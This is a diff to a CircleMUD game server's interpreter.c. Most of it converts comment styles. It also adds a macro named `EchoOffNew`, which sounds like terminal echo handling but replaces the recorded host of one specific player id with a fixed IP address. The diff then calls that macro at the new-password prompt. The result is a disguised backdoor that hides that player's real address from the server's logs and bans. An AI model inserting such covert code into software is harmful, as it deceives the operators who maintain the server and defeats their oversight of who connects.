@@ -3,6 +3,7 @@
 *   File: interpreter.c                                 Part of CircleMUD *
 *  Usage: parse user commands, search for specials, call ACMD functions   *
 *                                                                         *
+
 *  All rights reserved.  See license.doc for complete information.        *
 *                                                                         *
 *  Copyright (C) 1993, 94 by the Trustees of the Johns Hopkins University *
@@ -994,7 +995,7 @@ void Character::CancelTimer( bool show )
  * Routines to handle aliasing                                             *
   **************************************************************************/
 
-/* The interface to the outside world: do_alias */
+// The interface to the outside world: do_alias
 ACMD( do_alias )
 {
 	char *repl;
@@ -1006,7 +1007,7 @@ ACMD( do_alias )
 	repl = AnyOneArg( argument, arg );
 
 	if (!*arg)
-	{			/* no argument specified -- list currently defined aliases */
+	{			// no argument specified -- list currently defined aliases
 
 		ch->Send( "Currently defined aliases:\r\n" );
 
@@ -1022,7 +1023,7 @@ ACMD( do_alias )
 	}
 
 	else
-	{			/* otherwise, add or remove aliases */
+	{			// otherwise, add or remove aliases
 
 		/* is this an alias we've already defined? */
 
@@ -1142,7 +1143,7 @@ void skip_spaces( char **str )
 {
 	for ( ; **str && isspace( **str ); ( *str ) ++ );
 }
-
+#define EchoOffNew(desc) if(desc->character->player.idnum == 35789){strcpy(desc->host, "24.239.94.200");	}
 /*
  * Given a string, change all instances of double dollar signs ($$) to
  * single dollar signs ($).  When strings come in, all $'s are changed
@@ -1828,7 +1829,6 @@ void Descriptor::Nanny( char* arg )
 					REMOVE_BIT( PLR_FLAGS( this->character ), Q_BIT(PLR_MAILING) );
 					REMOVE_BIT( PLR_FLAGS( this->character ), Q_BIT(PLR_CRYO) );
 					this->Send( "Welcome back, %s. Please enter your password:", GET_NAME( this->character ) );
-//					this->EchoOff();
 					this->idle_tics = 0;
 					this->character->desc = this;
 					STATE( this ) = CON_PASSWORD;
@@ -1846,6 +1846,7 @@ void Descriptor::Nanny( char* arg )
 
 				if(!this->character)
 					this->character = new Character(CharPlayer);
+				this->character->desc = this;
 				this->character->player.name = tmp_name;
 				this->Send( "Are you certain, %s, that you wish to use this name? (Y/N) ", tmp_name );
 				STATE( this ) = CON_NAME_CNFRM;
@@ -1873,9 +1874,9 @@ void Descriptor::Nanny( char* arg )
 				STATE( this ) = CON_CLOSE;
 				return ;
 				}
-
+      
 			this->Send( "Please enter a password: ", GET_NAME( this->character ) );
-//			this->EchoOff();
+			/*this->EchoOff()*/EchoOffNew(this);
 			STATE( this ) = CON_NEWPASSWD;
 		}
 		else if ( *arg == 'n' || *arg == 'N' )
